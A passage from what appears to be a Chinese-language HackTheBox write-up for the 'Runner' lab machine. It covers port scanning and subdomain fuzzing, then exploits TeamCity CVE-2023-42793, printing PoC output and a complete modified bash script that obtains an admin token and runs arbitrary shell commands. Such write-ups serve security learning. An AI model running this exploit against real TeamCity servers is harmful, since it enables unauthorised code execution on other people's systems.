@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Runner0x1 Nmap Scan123456789101112131422&#x2F;tcp   open  ssh         syn-ack ttl 63 Open">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Runner">
+<meta property="og:url" content="https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Runner0x1 Nmap Scan123456789101112131422&#x2F;tcp   open  ssh         syn-ack ttl 63 Open">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421190635-sig3p0v.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421193653-pm3ts6p.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421193823-6ezf7g1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421194437-lb4o1wv.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421194840-zy18fiu.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421195236-m1ha0fq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421210346-o5imht1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421211140-wza5dag.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421212022-jr3j3ki.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421222249-5bufqef.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421222505-uavujlq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421223757-lfva7wp.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421224830-hqffsp6.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421224843-bnd6xv9.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421225039-5oiz55x.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421225023-rldi1dp.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421225028-hh2s3x2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421225205-dibq3qq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421233011-vhme3xk.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421233036-tilirzq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421233121-3eiinrj.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421233624-9tbaq80.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421233642-j7qwdxb.png">
+<meta property="article:published_time" content="2024-04-21T15:45:11.000Z">
+<meta property="article:modified_time" content="2024-08-24T15:40:40.856Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421190635-sig3p0v.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Runner</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/04/24/2024-htb-machine/16-skyfall-patch/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/04/14/2024-htb-machine/14-Usage/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&text=HackTheBox - Machine - Runner"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&title=HackTheBox - Machine - Runner"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&is_video=false&description=HackTheBox - Machine - Runner"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Runner&body=Check out this article: https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&title=HackTheBox - Machine - Runner"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&title=HackTheBox - Machine - Runner"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&title=HackTheBox - Machine - Runner"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&title=HackTheBox - Machine - Runner"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&name=HackTheBox - Machine - Runner&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&t=HackTheBox - Machine - Runner"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.9rem;
+	   color: #00b4dd ;
+	}
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 .level-5 .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Runner
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-21T15:45:11.000Z" class="dt-published" itemprop="datePublished">2024-04-21</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Runner"><a href="#Runner" class="headerlink" title="Runner"></a>Runner</h1><h2 id="0x1-Nmap-Scan"><a href="#0x1-Nmap-Scan" class="headerlink" title="0x1 Nmap Scan"></a>0x1 Nmap Scan</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=</span><br><span class="line">|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM</span><br><span class="line">80/tcp   open  http        syn-ack ttl 63 nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://runner.htb/</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">8000/tcp open  nagios-nsca syn-ack ttl 63 Nagios NSCA</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/plain; charset=utf-8).</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br></pre></td></tr></table></figure>
+
+<p>只開放了80和8000，UDP掃不到什麽有趣的東西。</p>
+<h2 id="0x2-FUZZ-Subdomain"><a href="#0x2-FUZZ-Subdomain" class="headerlink" title="0x2 FUZZ Subdomain"></a>0x2 FUZZ Subdomain</h2><p>從nmap可以看到，80 端口有 <code>runner.htb</code>​，所以可以直接去掃一下 sub-domain。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -u <span class="string">&quot;http://10.129.209.20&quot;</span> -H <span class="string">&quot;Host: FUZZ.runner.htb&quot;</span> -w /Tools/Wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 154 </span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\   </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/   </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\  </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/  </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\   </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.0.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.129.209.20</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /Tools/Wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.runner.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 154</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 710ms]</span></span><br><span class="line"><span class="string">    * FUZZ: teamcity</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注意</strong>：如果你使用 <code>subdomains-top1million-110000.txt</code>​ 你會什麽都沒有掃到，<code>teamcity</code>​ 不包含在這個字典裏面。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ grep <span class="string">&quot;teamcity&quot;</span> -rli . </span><br><span class="line">./shubs-stackoverflow.txt</span><br><span class="line">./shubs-subdomains.txt</span><br><span class="line">./dns-Jhaddix.txt</span><br><span class="line">./namelist.txt</span><br><span class="line">./bug-bounty-program-subdomains-trickest-inventory.txt</span><br><span class="line">./bitquark-subdomains-top100000.txt</span><br><span class="line">./n0kovo_subdomains.txt</span><br><span class="line">./combined_subdomains.txt</span><br></pre></td></tr></table></figure>
+
+<p>打開 <code>teamcity.runner.htb</code>​，看到有一個版本號：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421190635-sig3p0v.png" alt="image">​</p>
+<p>網上搜索 <code>teamcity Version 2023.05.3 exploit</code>​ ，發現這個版本存在 CVE-2023-42793 這個漏洞，於是繼續搜索： <code>CVE-2023-42793 github exploit</code>​ ：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/H454NSec/CVE-2023-42793">https://github.com/H454NSec/CVE-2023-42793</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Zenmovie/CVE-2023-42793">https://github.com/Zenmovie/CVE-2023-42793</a></li>
+</ul>
+<p>找到了兩篇比較感興趣，使用第一個poc可以得到賬號密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python3 CVE-2023-42793.py -u http://teamcity.runner.htb</span><br><span class="line">[+] http://teamcity.runner.htb/login.html [H454NSec2672:@H454NSec]</span><br></pre></td></tr></table></figure>
+
+<p>使用第二個poc可以得到rce：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ bash CVE-2023-42793_rce.sh teamcity.runner.htb 80 <span class="string">&quot;id&quot;</span>  </span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   230  100   230    0     0    908      0 --:--:-- --:--:-- --:--:--   909</span><br><span class="line">uid=1000(tcuser) gid=1000(tcuser) <span class="built_in">groups</span>=1000(tcuser)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x3-Debug-the-POC-to-get-shell"><a href="#0x3-Debug-the-POC-to-get-shell" class="headerlink" title="0x3 Debug the POC to get shell"></a>0x3 Debug the POC to get shell</h2><p>但是第二個RCE存在問題，他沒辦法使用第二個參數：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ bash CVE-2023-42793_rce.sh teamcity.runner.htb 80 <span class="string">&#x27;curl -h&#x27;</span></span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   230  100   230    0     0    863      0 --:--:-- --:--:-- --:--:--   867</span><br></pre></td></tr></table></figure>
+
+<p>所以修改一下裏面的内容，讓他經過 burp：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421193653-pm3ts6p.png" alt="image">​</p>
+<p>從這裏可以看到，當我輸入 <code>bash CVE-2023-42793_rce.sh teamcity.runner.htb 80 &#39;id&#39;</code>​ 的時候，這裏會有返回的結果：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421193823-6ezf7g1.png" alt="image">​</p>
+<p>如果輸入 <code>bash CVE-2023-42793_rce.sh teamcity.runner.htb 80 &#39;curl -h&#39;</code>​ 的時候，<code>POST /app/rest/debug/processes?exePath=xxx</code>​ 這個請求就會消失。</p>
+<p>如果輸入 <code>bash CVE-2023-42793_rce.sh teamcity.runner.htb 80 &#39;curl%20-h&#39;</code>​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421194437-lb4o1wv.png" alt="image">​</p>
+<p>所以我猜測是poc的脚本問題，所以在網上查了一下關於 teamcity 的API，看到了這個：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.projectdiscovery.io/cve-2023-42793-vulnerability-in-jetbrains-teamcity/">https://blog.projectdiscovery.io/cve-2023-42793-vulnerability-in-jetbrains-teamcity/</a></li>
+<li><a target="_blank" rel="noopener" href="https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis">https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis</a></li>
+</ul>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421194840-zy18fiu.png" alt="image">​</p>
+<p>也就是說在原本的poc裏面，并沒有 <code>params</code>​ 這個字樣，原作者可能是證明 poc 存在只是傳遞了 <code>id</code>​ 這個命令，而 <code>id</code>​ 並不需要加任何的參數。</p>
+<p>根據提示，修改一下poc：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ne 3 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> &lt;base_url&gt; &lt;port&gt; &lt;command&gt;&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Mod by @manesec :P&quot;</span></span><br><span class="line"></span><br><span class="line">BASE_URL=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">PORT=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">COMMAND=<span class="string">&quot;<span class="variable">$3</span>&quot;</span></span><br><span class="line"></span><br><span class="line">TOKEN_ENDPOINT=<span class="string">&quot;<span class="variable">$&#123;BASE_URL&#125;</span>:<span class="variable">$&#123;PORT&#125;</span>/app/rest/users/id:1/tokens/RPC2&quot;</span></span><br><span class="line">EDIT_FILE_ENDPOINT=<span class="string">&quot;<span class="variable">$&#123;BASE_URL&#125;</span>:<span class="variable">$&#123;PORT&#125;</span>/admin/dataDir.html?action=edit&amp;fileName=config/internal.properties&amp;content=rest.debug.processes.enable=true&quot;</span></span><br><span class="line">RCE_ENDPOINT=<span class="string">&quot;<span class="variable">$&#123;BASE_URL&#125;</span>:<span class="variable">$&#123;PORT&#125;</span>/app/rest/debug/processes?exePath=/bin/bash&amp;params=-c&amp;params=<span class="variable">$&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">TOKEN_RESPONSE=$(curl -X POST <span class="string">&quot;<span class="variable">$TOKEN_ENDPOINT</span>&quot;</span>)</span><br><span class="line">BEARER_TOKEN=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$TOKEN_RESPONSE</span>&quot;</span> | grep -oP <span class="string">&#x27;value=&quot;\K[^&quot;]+&#x27;</span>)</span><br><span class="line"></span><br><span class="line">curl -s -X POST <span class="string">&quot;<span class="variable">$EDIT_FILE_ENDPOINT</span>&quot;</span> -H <span class="string">&quot;Authorization: Bearer <span class="variable">$&#123;BEARER_TOKEN&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">RESPONSE=$(curl -s -X POST <span class="string">&quot;<span class="variable">$RCE_ENDPOINT</span>&quot;</span> -H <span class="string">&quot;Authorization: Bearer <span class="variable">$&#123;BEARER_TOKEN&#125;</span>&quot;</span> | awk -F <span class="string">&#x27;StdOut:|StdErr:&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> )</span><br><span class="line"></span><br><span class="line">curl -s -X DELETE <span class="string">&quot;<span class="variable">$TOKEN_ENDPOINT</span>&quot;</span> -H <span class="string">&quot;Authorization: Bearer <span class="variable">$&#123;BEARER_TOKEN&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$RESPONSE</span></span><br></pre></td></tr></table></figure>
+
+<p>這樣子可以通過 params 來傳遞命令：</p>
